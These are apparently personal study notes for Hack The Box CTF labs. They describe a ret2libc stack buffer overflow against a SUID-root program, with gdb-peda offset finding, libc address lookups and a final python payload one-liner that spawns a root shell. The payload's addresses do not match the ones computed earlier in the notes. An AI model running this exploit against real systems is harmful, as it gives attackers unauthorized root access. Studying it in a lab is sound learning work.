Take a look at this lab:
https://0xdf.gitlab.io/2019/03/26/htb-october.html
https://0xdf.gitlab.io/2021/03/02/htb-sneaky
https://pencer.io/ctf/ctf-htb-sneaky/

Segmentation fault (core dumped)

For privilege escalation, this program must have SUID privileges.

Check if ASLR is on:
cat /proc/sys/kernel/randomize_va_space

Check also for NX:
checksec <<program>>

Summarizing: You will use gdb to see where the program crashes. Then, adding the function that you want in the treshold (in this case, "system" function to execute "/bin/sh"). The ldd thing is to figure out were in memory is the C function "system" to execute "/bin/sh". Because the vulnerable program runs with suid as root, the /bin/sh will create a new shell with "root" privileges.

gdb program

pattern_create -l 400 (to create random strings)
run <string from pattern_create>
pattern_offset -q <<the string>>
Take the result and check with the above pattern_offset. You just found now where to put the payload.

Then, time to see where the function is located in memory.

ldd program (to check the libraries used. In this case, it's an ELF file, it uses libc)
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/"

After finding the location in memory for libc and the others, we need to do the operation below (libc + 0xnumber...):
gdb-peda$ p 0xb7e44000 + 0x00040310
$1 = 0xb7e84310
gdb-peda$ p 0xb7e44000 + 0x00033260
$2 = 0xb7e77260
gdb-peda$ p 0xb7e44000 + 0x162bac
$3 = 0xb7fa6bac


I can put that all together into this template: "A" * number + SYSTEM + EXIT + /bin/sh. 
./program $(python -c 'print("a"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')

